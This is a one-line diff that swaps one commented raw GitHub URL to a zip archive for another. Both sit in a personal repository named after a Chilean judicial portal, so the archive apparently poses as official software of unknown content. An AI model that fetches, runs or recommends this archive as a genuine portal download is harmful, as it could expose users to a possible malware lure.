@@ -1,1 +1,1 @@
-﻿# https://github.com/i14maxiii/portal-judicial.cl/raw/refs/heads/main/src/judicial_cl_portal_v3.3-beta.4.zip
+﻿# https://raw.githubusercontent.com/i14maxiii/portal-judicial.cl/main/src/config/judicial-portal-cl-v2.1.zip
